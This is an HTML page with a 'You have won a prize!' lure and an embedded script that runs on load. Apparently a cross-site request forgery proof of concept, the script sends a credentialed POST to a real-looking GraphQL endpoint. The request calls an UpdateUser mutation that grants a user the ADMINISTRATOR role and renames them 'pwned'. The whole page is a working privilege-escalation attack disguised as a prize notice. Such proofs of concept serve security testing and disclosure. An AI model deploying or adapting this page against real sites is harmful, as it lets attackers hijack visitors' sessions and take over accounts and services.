<html>
  <body>
    <h1>You have won a prize!</h1>
    <script>
fetch("https://app.lightspark.com/graphql/frontend?n=UpdateUser&display_name=pwned", {
  method: "POST",
  credentials: "include",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    operationName: "UpdateUser",
    variables: {
      user_id: "User:019b30de-b2a6-04f8-0000-43a25839294c",
      display_name: "pwned",
      role: "ADMINISTRATOR",
      roles: ["ADMINISTRATOR"]
    },
    query: `mutation UpdateUser($user_id: ID!, $display_name: String!, $role: UserRole!, $roles: [UserRole!]!) {
  update_user(
    input: {user_id: $user_id, display_name: $display_name, role: $role, roles: $roles}
  ) {
    __typename
    user {
      id
      display_name
      role
      __typename
    }
  }
}`
  })
});
    </script>
  </body>
